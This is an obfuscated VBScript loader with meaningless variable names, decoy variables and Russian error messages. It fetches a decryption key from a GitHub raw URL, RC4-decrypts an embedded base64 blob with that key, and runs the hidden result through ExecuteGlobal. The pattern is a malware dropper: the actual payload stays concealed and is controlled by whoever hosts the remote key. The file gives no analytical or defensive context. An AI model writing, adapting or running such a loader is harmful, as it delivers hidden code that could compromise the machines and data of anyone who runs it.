Option Explicit
Dim v000:v000="https"&"://"&"github.com/049-bit/K/raw/refs/heads/main/key.txt"
Dim v001,v002,v003(5)
v001="Неиспользуемый текст"
v002=12345
Dim v004,v005,v006
v004="jFqjXa62LSI6WR2B9Zo"
v005="riDSg26U2R25zNwQBtA=="
v006=v004&v005
Function f001(v007)
Dim v008,v009
On Error Resume Next
Set v008=CreateObject("WinHttp"&".WinHttpRequest"&".5"&".1")
If Err.Number<>0 Then
f001="Ошибка создания WinHttp: "&Err.Description
Exit Function
End If
v008.Open "GET",v007,False
v008.Send
If Err.Number<>0 Then
f001="Ошибка запроса: "&Err.Description
Exit Function
End If
If v008.Status=200 Then
v009=v008.ResponseText
v009=Trim(v009)
If Len(v009)<16 Then
v009=v009&String(16-Len(v009),Chr(0))
ElseIf Len(v009)>16 Then
v009=Left(v009,16)
End If
f001=v009
Else
f001="Ошибка HTTP: "&v008.Status&" "&v008.StatusText
End If
Set v008=Nothing
End Function
Class CryptoWrapper
Private v010
Private Sub Class_Initialize()
v010=f001(v000)
If Left(v010,6)="Ошибка" Then
MsgBox v010,vbCritical,"Ошибка загрузки ключа"
WScript.Quit 1
End If
End Sub
Public Function DecodeData(v011)
Dim v012
v012=f002(v011)
v012=f003(v012,v010)
DecodeData=f004(v012)
End Function
Private Function f002(v013)
Dim v014,v015
Set v014=CreateObject("MSXML2"&".DOMDocument"&".3"&".0")
Set v015=v014.CreateElement("tmp")
v015.DataType="bin"&".base64"
v015.Text=v013
f002=v015.nodeTypedValue
End Function
Private Function f003(v016,v017)
Dim v018(255),v019,v020,v021,v022
Dim v023(),v024
For v019=0 To 255
v018(v019)=v019
Next
v020=0
For v019=0 To 255
v020=(v020+v018(v019)+Asc(Mid(v017,(v019 Mod Len(v017))+1,1)))Mod 256
v022=v018(v019)
v018(v019)=v018(v020)
v018(v020)=v022
Next
v019=0:v020=0
v024=LenB(v016)
ReDim v023(v024-1)
For v021=1 To v024
v019=(v019+1)Mod 256
v020=(v020+v018(v019))Mod 256
v022=v018(v019)
v018(v019)=v018(v020)
v018(v020)=v022
Dim v025
v025=v018((v018(v019)+v018(v020))Mod 256)
v023(v021-1)=AscB(MidB(v016,v021,1))Xor v025
Next
Dim v026
v026=""
For v021=0 To v024-1
v026=v026&ChrB(v023(v021))
Next
f003=v026
End Function
Private Function f004(v027)
Dim v028,v029
v028=""
For v029=1 To LenB(v027) Step 2
Dim v030,v031
v030=AscB(MidB(v027,v029,1))
v031=AscB(MidB(v027,v029+1,1))
v028=v028&ChrW(v031*256+v030)
Next
f004=v028
End Function
End Class
v003(0)=Now()
v001=v001&CStr(v002*0)
Dim v032
Set v032=New CryptoWrapper
Dim v033
v033=v032.DecodeData(v006)
ExecuteGlobal v033
